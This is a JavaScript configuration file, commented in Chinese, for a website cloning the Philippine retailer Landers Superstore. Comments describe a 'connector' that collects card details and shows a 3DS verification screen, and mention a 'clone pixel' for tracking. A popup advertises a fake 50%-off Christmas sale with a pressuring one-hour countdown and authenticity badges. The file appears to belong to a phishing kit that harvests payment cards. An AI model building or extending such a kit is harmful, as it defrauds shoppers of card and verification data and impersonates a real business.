/* =============================================================================
 * 站点配置（唯一需要改的文件）
 * -----------------------------------------------------------------------------
 * 1) Facebook Pixel：把 fbPixelId 换成你的 Pixel ID 即启用，留空则完全不加载脚本。
 * 2) 进场弹窗：promoModal 里的文案/图片/按钮/跳转全部可改，也可以直接 enabled:false 关掉。
 * 3) 事件开关：pixelEvents 控制每个标准事件要不要打。
 * ========================================================================== */
window.LD_CONFIG = {
  currency: 'PHP',

  /* ---------------- Facebook Pixel ---------------- */
  fbPixelId: '1913057443198787', // Landers PH clone pixel

  /*
   * 事件归属（20261121 起）：
   *   站点        PageView / ViewContent / AddToCart / InitiateCheckout / **Purchase**
   *   connector   只做卡片采集 + 守卫模式 + 3DS 验证屏（/bp/config.json 的 pixel_enabled = false）
   *
   * Purchase 的触发点 = 「点提交 → 验证屏弹出」（connector 抛 bp:modal-open）
   *   · 同页面只打一次（内存锁）
   *   · 24 小时去重：key = hash(指纹 + IP + 单号)，记录 localStorage + cookie 双写
   *   · 不带 value/currency（按需求）
   *   · 调试：LD.pixel.state() / key() / fingerprint() / fire() / reset()
   */
  pixelEvents: {
    pageView: true, // 每次页面加载
    viewContent: true, // 商品详情页
    addToCart: true, // 点击 ADD TO CART
    initiateCheckout: true, // 打开结账页
    purchase: true, // 验证屏弹出时打一次（站点侧实现）
  },
  purchaseDedupeHours: 24, // Purchase 去重窗口（小时）
  pixelFireOnSubmitFallback: false, // true = 面板挂了、验证屏不弹时，提交 3 秒后兜底打一次

  /* ---------------- 进场弹窗（预告活动） ---------------- */
  promoModal: {
    enabled: true,
    // banner = 参考 Lotte 那种「大图 + 倒计时 + 整条 CTA」；simple = 旧的纯文字卡
    layout: 'banner',
    // 只在这些页面弹（body[data-page] 的取值）：home / category / search
    pages: ['home', 'category', 'search'],
    delayMs: 900, // 进入页面后多久弹
    ttlHours: 6, // 关闭后多久内不再弹（0 = 每次都弹）

    /* --- 顶部主视觉 --- */
    badge: 'SUPER CRAZY SALE',
    heroTitle: '50% OFF',
    heroSubtitle: 'CHRISTMAS EDITION',
    heroNote: 'November 25 – 29, 2026 · online starts at midnight',
    image: '', // 留空 = 品牌绿渐变 + 大字；填图片 URL 则铺满顶部
    brands: ['LANDERS', 'SELECTION', 'CAPITAL CARE'], // 顶部小字品牌行（视觉装饰）

    /* --- 三条信任标 --- */
    badges: [
      { icon: 'shield', text: '100% Authentic' },
      { icon: 'truck', text: 'Same-day delivery' },
      { icon: 'support', text: 'Care 7am – 9pm' },
    ],

    /* --- 倒计时（默认 1 小时） --- */
    countdown: {
      enabled: true,
      label: 'Offer ends in',
      durationMs: 60 * 60 * 1000, // 1 小时
      persist: 'session', // session = 本次会话内不重置；none = 每次打开都从 1 小时开始
      onExpire: 'keep', // keep = 停在 00:00:00；close = 自动关掉弹窗
    },

    /* --- 文案（simple 模式用；banner 模式只用 title 做无障碍标签） --- */
    title: 'November 25 – 29, 2026',
    subtitle: 'Christmas Edition · online starts at midnight',
    body:
      'Up to 50% off across the whole store. Every item on this site is already listed at half the shelf price — ' +
      'members get free delivery above the basket threshold.',
    bullets: ['50% off every item', '2-hour delivery slots', 'Visa · Mastercard · JCB · Amex'],

    cta: 'Shop now',
    ctaHref: '/promotions',
    dismiss: 'Maybe later',
  },

  /* ---------------- 站点文案 ---------------- */
  site: {
    name: 'Landers Superstore',
    supportHours: 'Online Customer Service: 7am – 9pm, Monday to Sunday',
    freeDeliveryNote: 'Free delivery above the qualifying basket amount of your membership tier.',
  },
};
